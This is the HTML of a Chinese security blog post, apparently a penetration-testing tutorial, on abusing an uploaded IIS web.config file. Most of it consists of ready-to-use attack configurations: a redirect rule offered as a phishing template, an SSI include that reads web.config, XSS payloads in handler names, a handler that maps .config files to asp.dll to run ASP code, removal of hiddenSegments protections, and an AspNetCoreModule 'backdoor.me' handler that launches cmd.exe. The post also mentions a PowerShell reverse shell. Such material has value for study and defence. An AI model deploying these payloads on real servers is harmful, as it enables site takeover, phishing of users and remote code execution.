@@ -1,0 +1,1416 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="四方食事，不过一碗人间烟火。  首发：合天智汇 本文主要介绍web.config文件在渗透中的作用，即可上传一个web.config时的思路，话不多说，开始正题。首先我们来看一下web.config是什么，援引百度百科的介绍： 　  Web.config文件是一个XML文本文件，它用来储存ASP.NETWeb 应用程序的配置信息,它可以出现在应用程序的每一个目录中。在运行时对Web.config文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web.config在渗透中的作用">
+<meta property="og:url" content="https://lengjibo.github.io/webconf/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="四方食事，不过一碗人间烟火。  首发：合天智汇 本文主要介绍web.config文件在渗透中的作用，即可上传一个web.config时的思路，话不多说，开始正题。首先我们来看一下web.config是什么，援引百度百科的介绍： 　  Web.config文件是一个XML文本文件，它用来储存ASP.NETWeb 应用程序的配置信息,它可以出现在应用程序的每一个目录中。在运行时对Web.config文">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gaxk8z5o6zj30s70bx3zw.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gaxk97d3kij30vu0exmyg.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gaxkirdrm5j30kh09p0ti.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gaxll65dwsj30h706st9e.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gayoc9bf38j30mu0e10xn.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gaypdf39ojj30jp0avjrj.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gazaogbemoj30no0eg76h.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gazd3o68gnj30ne0hcgn3.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gazeiwbzxcj30nc0ctt98.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gazel5weltj30r10g574r.jpg">
+<meta property="og:updated_time" content="2020-01-21T13:38:40.879Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="web.config在渗透中的作用">
+<meta name="twitter:description" content="四方食事，不过一碗人间烟火。  首发：合天智汇 本文主要介绍web.config文件在渗透中的作用，即可上传一个web.config时的思路，话不多说，开始正题。首先我们来看一下web.config是什么，援引百度百科的介绍： 　  Web.config文件是一个XML文本文件，它用来储存ASP.NETWeb 应用程序的配置信息,它可以出现在应用程序的每一个目录中。在运行时对Web.config文">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gaxk8z5o6zj30s70bx3zw.jpg">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/webconf/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>web.config在渗透中的作用 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Beranda</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Tentang</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategori</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Arsip</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/webconf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">web.config在渗透中的作用
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Diposting di</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2020-01-21 21:35:22 / Updated at: 21:38:40" itemprop="dateCreated datePublished" datetime="2020-01-21T21:35:22+08:00">2020-01-21</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Di</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/" itemprop="url" rel="index"><span itemprop="name">Ｗeb安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>四方食事，不过一碗人间烟火。</p>
+<hr>
+<p>首发：合天智汇</p>
+<p>本文主要介绍web.config文件在渗透中的作用，即可上传一个web.config时的思路，话不多说，开始正题。首先我们来看一下web.config是什么，援引百度百科的介绍：
+　</p>
+<blockquote>
+<p>Web.config文件是一个XML文本文件，它用来储存ASP.NETWeb 应用程序的配置信息,它可以出现在应用程序的每一个目录中。在运行时对Web.config文件的修改不需要重启服务就可以生效.</p>
+</blockquote>
+<p>关键词：xml文本、.net配置、无需重启，这几个特性就决定了其在渗透中的作用，我们来看下具体操作。</p>
+<a id="more"></a>
+<p>以下实验环境为:</p>
+<p>windows server 2008</p>
+<p>iis 7</p>
+<p>.net 3.5</p>
+<h2 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h2><h3 id="（一）使用web-config进行重定向钓鱼"><a href="#（一）使用web-config进行重定向钓鱼" class="headerlink" title="（一）使用web.config进行重定向钓鱼"></a>（一）使用web.config进行重定向钓鱼</h3><p>在iis中有一项为url redirect也就是用来进行url重定向的，当我们可以长传一个web.config的时候我们就可以使用这种方式来进行钓鱼攻击，在这里要注意的是，不同的iis版本的配置稍有不同，以本次环境中的iis7为例，假如我们想让目标网站跳转到baidu，我们只需要这样写我们的web.config：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;httpRedirect enabled=&quot;true&quot; destination=&quot;https://www.baidu.com/&quot; /&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+<p>中间的一行为我们具体实现的代码，即开启重定向并重定向到百度，剩下的都是服务默认的自带的，相当于模板，此时我们访问目标站点，就会跳转到baidu了。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gaxk8z5o6zj30s70bx3zw.jpg" alt="截图_2020-01-15_21-17-52.png"></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gaxk97d3kij30vu0exmyg.jpg" alt="截图_2020-01-15_21-18-36.png"></p>
+<p>而大于等于iis7版本就稍微复杂一些，因为在这之后多了一个url write功能，其中包含了url重定向，所以很多开发选择使用这个功能进行操作。我们来看一下，如果为url write该如何去做。假如我们在url write定义了一个规则为：为所有不带斜杠(/)的网址，自动加上斜杠(/)，比如下图这样：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gaxkirdrm5j30kh09p0ti.jpg" alt="截图_2020-01-15_21-28-43.png"></p>
+<p>那么我们的web.config就会自动生成以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;rewrite&gt;</span><br><span class="line">            &lt;rules&gt;</span><br><span class="line">                &lt;rule name=&quot;AddTrailingSlashRule1&quot; stopProcessing=&quot;true&quot;&gt;</span><br><span class="line">                    &lt;match url=&quot;(.*[^/])$&quot; /&gt;</span><br><span class="line">                    &lt;conditions&gt;</span><br><span class="line">                        &lt;add input=&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType=&quot;IsDirectory&quot; negate=&quot;true&quot; /&gt;</span><br><span class="line">                        &lt;add input=&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType=&quot;IsFile&quot; negate=&quot;true&quot; /&gt;</span><br><span class="line">                    &lt;/conditions&gt;</span><br><span class="line">                    &lt;action type=&quot;Redirect&quot; url=&quot;&#123;R:1&#125;/&quot; /&gt;</span><br><span class="line">                &lt;/rule&gt;</span><br><span class="line">            &lt;/rules&gt;</span><br><span class="line">        &lt;/rewrite&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+<p>看起来有些难懂，下面稍微给大家说一下，首先在url write分为入站规则(<rules>)和出站规则(<outboundrules>)他们需要写在&lt;system.webServer&gt;的<rewrite>元素内，我们一般钓鱼只考虑入站规则，AddTrailingSlashRule1为一个新的规则名字，可随意定义，若stopProcessing指定为true则若当前请求与规则匹配，则不再匹配其他请求。<match>为进行匹配的url，一般使用正则表达式的形式，而<action>元素告诉IIS如何处理与模式匹配的请求，使用type属性来进行处理，一般有以下几个：</action></match></rewrite></outboundrules></rules></p>
+<ul>
+<li>None： </li>
+<li>Rewrite：将请求重写为另一个URL。</li>
+<li>Redirect：将请求重定向到另一个URL。</li>
+<li>CustomResponse：向客户返回自定义响应。</li>
+<li>AbortRequest：删除请求的HTTP连接。</li>
+</ul>
+<p>而redirectType属性指定要使用永久重定向还是临时重定向。剩下的大家可以查阅msdn上面的手册，写的非常详细。说了这么多，估计大家就能明白怎么去写web.config了，给出大家一个url write的web.config钓鱼模板，可自行进行修改：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;rule name=&quot;RedirectToHTTPS&quot; stopProcessing=&quot;true&quot;&gt;</span><br><span class="line">  &lt;match url=&quot;(.*)&quot; /&gt;</span><br><span class="line">  &lt;conditions&gt;</span><br><span class="line">    &lt;add input=&quot;&#123;HTTPS&#125;&quot; pattern=&quot;off&quot; ignoreCase=&quot;true&quot; /&gt;</span><br><span class="line">  &lt;/conditions&gt;</span><br><span class="line">  &lt;action type=&quot;Redirect&quot; url=&quot;https://&#123;SERVER_NAME&#125;/&#123;R:1&#125;&quot; redirectType=&quot;Permanent&quot; /&gt;</span><br><span class="line">&lt;/rule&gt;</span><br></pre></td></tr></table></figure>
+<p>因为web.config不需要重启服务，所以当我们能够传一个web.config上去的时候，我们也就达到了我们的目的，也有可能运维人员已经写好了一些规则，我们不想贸然惊动管理者的话，如果此时我们可以上传.shtm或.shtml文件，并使用以下代码来读取web.config的内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- test.shtml --&gt;</span><br><span class="line">&lt;!--#include file=&quot;/web.config&quot; --&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gaxll65dwsj30h706st9e.jpg" alt="截图_2020-01-15_22-05-39.png"></p>
+<p>并根据读取的内容来进行后续操作。</p>
+<h3 id="（二）使用web-config进行xss"><a href="#（二）使用web-config进行xss" class="headerlink" title="（二）使用web.config进行xss"></a>（二）使用web.config进行xss</h3><p>这是一种比较古老的技术，依靠web.config的name属性，来构造一个xss，前提是iis6或者更低的版本不支持这类攻击，假设我们上传的web.config内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">   &lt;system.webServer&gt;</span><br><span class="line">      &lt;handlers&gt;</span><br><span class="line">         &lt;!-- XSS by using *.config --&gt;</span><br><span class="line">         &lt;add name=&quot;web_config_xss&amp;lt;script&amp;gt;alert(&apos;xss1&apos;)&amp;lt;/script&amp;gt;&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;fooo&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;None&quot; preCondition=&quot;bitness64&quot; /&gt;</span><br><span class="line">         &lt;!-- XSS by using *.test --&gt;</span><br><span class="line">         &lt;add name=&quot;test_xss&amp;lt;script&amp;gt;alert(&apos;xss2&apos;)&amp;lt;/script&amp;gt;&quot; path=&quot;*.test&quot; verb=&quot;*&quot;  /&gt;</span><br><span class="line">      &lt;/handlers&gt;</span><br><span class="line">      &lt;security&gt;</span><br><span class="line">         &lt;requestFiltering&gt;</span><br><span class="line">            &lt;fileExtensions&gt;</span><br><span class="line">               &lt;remove fileExtension=&quot;.config&quot; /&gt;</span><br><span class="line">            &lt;/fileExtensions&gt;</span><br><span class="line">            &lt;hiddenSegments&gt;</span><br><span class="line">               &lt;remove segment=&quot;web.config&quot; /&gt;</span><br><span class="line">            &lt;/hiddenSegments&gt;</span><br><span class="line">         &lt;/requestFiltering&gt;</span><br><span class="line">      &lt;/security&gt;</span><br><span class="line">   &lt;httpErrors existingResponse=&quot;Replace&quot; errorMode=&quot;Detailed&quot; /&gt;</span><br><span class="line">   &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+<p>则我们访问该文件时则会弹出xss</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gayoc9bf38j30mu0e10xn.jpg" alt="截图_2020-01-16_20-26-17.png"></p>
+<h3 id="（三）使用web-config运行asp代码"><a href="#（三）使用web-config运行asp代码" class="headerlink" title="（三）使用web.config运行asp代码"></a>（三）使用web.config运行asp代码</h3><p>这类攻击方法其实也不是什么很稀奇的技术，因为web.config可以操控iis服务器，那么我们可以去调用system32\inetsrv\asp.dll文件，来达到运行任意asp代码的目的。比如下面这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">   &lt;system.webServer&gt;</span><br><span class="line">      &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;</span><br><span class="line">         &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt;        </span><br><span class="line">      &lt;/handlers&gt;</span><br><span class="line">      &lt;security&gt;</span><br><span class="line">         &lt;requestFiltering&gt;</span><br><span class="line">            &lt;fileExtensions&gt;</span><br><span class="line">               &lt;remove fileExtension=&quot;.config&quot; /&gt;</span><br><span class="line">            &lt;/fileExtensions&gt;</span><br><span class="line">            &lt;hiddenSegments&gt;</span><br><span class="line">               &lt;remove segment=&quot;web.config&quot; /&gt;</span><br><span class="line">            &lt;/hiddenSegments&gt;</span><br><span class="line">         &lt;/requestFiltering&gt;</span><br><span class="line">      &lt;/security&gt;</span><br><span class="line">   &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line">&lt;%</span><br><span class="line">Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;)</span><br><span class="line">&apos; it is running the ASP code if you can see 3 by opening the web.config file!</span><br><span class="line">Response.write(1+2)</span><br><span class="line">Response.write(&quot;&lt;!-&quot;&amp;&quot;-&quot;)</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>此时访问文件，则会输出3,运行其他的代码同理哦。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gaypdf39ojj30jp0avjrj.jpg" alt="截图_2020-01-16_21-02-09.png"></p>
+<h3 id="（四）使用web-config绕过hidden-segments"><a href="#（四）使用web-config绕过hidden-segments" class="headerlink" title="（四）使用web.config绕过hidden segments"></a>（四）使用web.config绕过hidden segments</h3><p>在iis7以后，微软为了增加其安全性增加了hidden segments功能对应请求过滤模块，也就是对一些不想让其他人访问的东西进行过滤，在被访问时返回给客户端一个404.8的状态码。一般在web.config中使用<hiddensegments>来进行指定隐藏的值。比如我们设置了一个文件夹为hiddenSegments，那么在访问时就是下图这种情况。</hiddensegments></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gazaogbemoj30no0eg76h.jpg" alt="f9dcd100baa1cd1152f2e48bbb12c8fcc2ce2dd0.jpg"></p>
+<p>比如文件夹为_private则对应生成的web.config内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">   &lt;system.webServer&gt;</span><br><span class="line">      &lt;security&gt;</span><br><span class="line">         &lt;requestFiltering&gt;</span><br><span class="line">            &lt;hiddenSegments applyToWebDAV=&quot;false&quot;&gt;</span><br><span class="line">               &lt;add segment=&quot;_private&quot; /&gt;</span><br><span class="line">            &lt;/hiddenSegments&gt;</span><br><span class="line">         &lt;/requestFiltering&gt;</span><br><span class="line">      &lt;/security&gt;</span><br><span class="line">   &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+<p>而此时我们可以通过上传web.config的形式，来绕过这种过滤。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;security&gt;</span><br><span class="line">            &lt;requestFiltering&gt;</span><br><span class="line">                &lt;hiddenSegments&gt;</span><br><span class="line">                    &lt;remove segment=&quot;bin&quot; /&gt;</span><br><span class="line">                    &lt;remove segment=&quot;App_code&quot; /&gt;</span><br><span class="line">                    &lt;remove segment=&quot;App_GlobalResources&quot; /&gt;</span><br><span class="line">                    &lt;remove segment=&quot;App_LocalResources&quot; /&gt;</span><br><span class="line">                    &lt;remove segment=&quot;App_Browsers&quot; /&gt;</span><br><span class="line">                    &lt;remove segment=&quot;App_WebReferences&quot; /&gt;</span><br><span class="line">                    &lt;remove segment=&quot;App_Data&quot; /&gt;</span><br><span class="line">					&lt;!--Other IIS hidden segments can be listed here --&gt;</span><br><span class="line">                &lt;/hiddenSegments&gt;</span><br><span class="line">            &lt;/requestFiltering&gt;</span><br><span class="line">        &lt;/security&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+<p>因为过滤的本质是使用的APP_Data或者App_GlobalResources进行的add，我们将其remove掉即可。</p>
+<h3 id="（五）使用web-config进行rce"><a href="#（五）使用web-config进行rce" class="headerlink" title="（五）使用web.config进行rce"></a>（五）使用web.config进行rce</h3><p>这个跟执行asp代码原理上差不多，主要是使用AspNetCoreModule模块去调用cmd进行命令执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">      &lt;handlers&gt;</span><br><span class="line">        &lt;remove name=&quot;aspNetCore&quot; /&gt;</span><br><span class="line">         &lt;add name=&quot;aspNetCore&quot; path=&quot;backdoor.me&quot; verb=&quot;*&quot; modules=&quot;AspNetCoreModule&quot; resourceType=&quot;Unspecified&quot; /&gt;</span><br><span class="line">      &lt;/handlers&gt;</span><br><span class="line">      &lt;aspNetCore processPath=&quot;cmd.exe&quot; arguments=&quot;/c calc&quot;/&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+<p>这个过程通过去访问服务器上的backdoor.me进行触发，因为是在服务端进行执行的，这时候我们可以如调用powershell，来返回一个反向的shell。</p>
+<h3 id="（六）使用系统秘钥来反序列化进行rce"><a href="#（六）使用系统秘钥来反序列化进行rce" class="headerlink" title="（六）使用系统秘钥来反序列化进行rce"></a>（六）使用系统秘钥来反序列化进行rce</h3><p>这个是一种.net的反序列化操作，有兴趣的朋友可以参考orange师傅在hicton上出的题<a href="https://xz.aliyun.com/t/3019" target="_blank" rel="noopener">https://xz.aliyun.com/t/3019</a></p>
